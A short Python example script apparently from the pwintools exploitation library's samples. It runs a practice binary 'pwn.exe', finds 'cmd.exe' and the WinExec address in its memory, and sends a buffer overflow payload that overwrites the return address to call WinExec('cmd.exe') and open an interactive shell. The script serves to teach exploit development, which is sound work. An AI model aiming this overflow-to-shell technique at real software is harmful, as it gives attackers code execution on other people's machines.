import sys
import os.path
sys.path.append(os.path.abspath(__file__ + "\..\.."))
from pwintools import *


# Run pwn.exe
proc = Process("pwn.exe")
print(proc)

# Search in memory cmd.exe
cmd_exe = proc.search_memory("cmd.exe\0")
if cmd_exe:
    print("0x{:x} : {}".format(cmd_exe, proc.leak(cmd_exe, 7)))

# Get WinExec address
WinExecImport = proc.get_import('kernel32.dll', 'WinExec')
print("WinExecImport : 0x{:x}".format(WinExecImport))

WinExec = u32(proc.leak(WinExecImport, 4))
k32WinExec = proc.get_remote_func_addr('kernel32.dll', 'WinExec')
print("WinExec imported 0x{:x} : kernel32!WinExec 0x{:x}".format(WinExec, k32WinExec))

print(proc.recvline())
print(proc.recvline())

# You can also Debug it in Python see PythonForWindows documentation
# proc.spawndebugger(False)
# Dirty crash incoming for pwn.exe :D
proc.send('A' * 0x80 + p32(WinExec) + p32(0x42424242) + p32(cmd_exe) + 'A' * 4)
proc.interactive()
proc.close()


# TODO Example with CREATE_SUSPENDED AND proc.threads[0].resume()